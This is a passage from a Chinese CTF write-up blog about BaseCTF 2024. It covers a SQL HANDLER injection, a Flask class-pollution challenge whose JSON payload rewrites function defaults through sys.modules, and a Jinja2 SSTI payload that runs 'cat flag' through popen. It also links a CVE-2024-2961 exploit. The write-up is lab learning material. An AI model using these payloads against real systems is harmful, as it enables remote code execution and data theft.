<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">delimiter orange<br>handler flag openorange<br>handler flag read next<br></code></pre></td></tr></table></figure>
<h3 id="lucky-number"><a class="markdownIt-Anchor" href="#lucky-number"></a> Lucky Number</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string,render_template<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> heaven<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/m4G1c&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            result = heaven.create()<br>            message = result[<span class="hljs-string">&quot;message&quot;</span>]<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧</span><br><span class="hljs-string">&quot;</span> + message<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br><br><br><span class="hljs-comment">#heaven.py</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">kon=<span class="hljs-string">&quot;Kon&quot;</span>, pure=<span class="hljs-string">&quot;Pure&quot;</span>, *, confirm=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br>    <span class="hljs-keyword">if</span> confirm <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;lucky_number&quot;</span> <span class="hljs-keyword">in</span> create.__kwdefaults__:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="hljs-string">&quot;lucky_number&quot;</span>]&#125;<br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;你有什么想创造的吗？&quot;</span>, <span class="hljs-string">&quot;lucky_number&quot;</span>: <span class="hljs-string">&quot;nope&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>也是一道原生类的题目orz</p>
<p>从已知的代码进行分析，在heaven.py里有create函数的<code>__kwdefaults__</code>,同时还需要confirm是true.涉及动态加载模块或处理模块之间的依赖时,需要<code>sys.modules</code> 来访问已经加载的模块.回到代码中并没有导入sys模组，这时可以利用python的内置函数<code>__spec__</code>.包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块，此处就可以使用json模块获取.(以上跟着官p学的，我还没学这么多orz)</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Content-Type: application/json<br></code></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;json&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;__spec__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;__init__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;__globals__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;sys&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;modules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;heaven&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;create&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;__kwdefaults__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;confirm&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                              <span class="hljs-attr">&quot;lucky_number&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5346&quot;</span><br>                                             <span class="hljs-punctuation">&#125;</span> <br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>然后会变成<code>快去/ssSstTti1注入吧</code></p>
<p>然后就是普通的无过滤的ssti注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>
<h3 id="just-readme"><a class="markdownIt-Anchor" href="#just-readme"></a> Just Readme</h3>
<p>官p给的是<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">ambionics/cnext-exploitsCNEXT 的漏洞(CVE-2024-2961)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Basectf2024</div>
      <div>https://0ran9ewww.github.io/2024/08/21/basectf/basectf2024/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月21日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/08/28/nepctf/nepctf2024/" title="nepctf2024复盘">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">nepctf2024复盘</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/" title="深入浅出PHP强弱比较">
                        <span class="hidden-mobile">深入浅出PHP强弱比较</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>